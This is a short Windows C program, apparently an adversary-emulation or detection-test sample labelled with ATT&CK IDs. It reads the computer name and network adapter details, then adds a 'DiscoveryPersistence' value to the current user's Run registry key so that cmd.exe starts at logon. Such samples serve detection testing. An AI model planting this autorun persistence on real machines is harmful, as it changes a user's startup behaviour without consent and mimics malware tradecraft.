/* Discovery combo + Persistence: T1082 + T1016 + T1547 */
#include <windows.h>
#include <iphlpapi.h>
#include <stdlib.h>

#pragma comment(lib, "iphlpapi")

int main(void) {
    char name[256] = { 0 };
    DWORD len = 256;
    GetComputerNameA(name, &len);
    ULONG blen = 0;
    GetAdaptersInfo(NULL, &blen);
    if (blen > 0) {
        PIP_ADAPTER_INFO p = (PIP_ADAPTER_INFO)malloc(blen);
        if (p) { GetAdaptersInfo(p, &blen); free(p); }
    }
    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "DiscoveryPersistence", 0, REG_SZ, (const BYTE *)"cmd.exe", 8);
        RegCloseKey(hKey);
    }
    return 0;
}
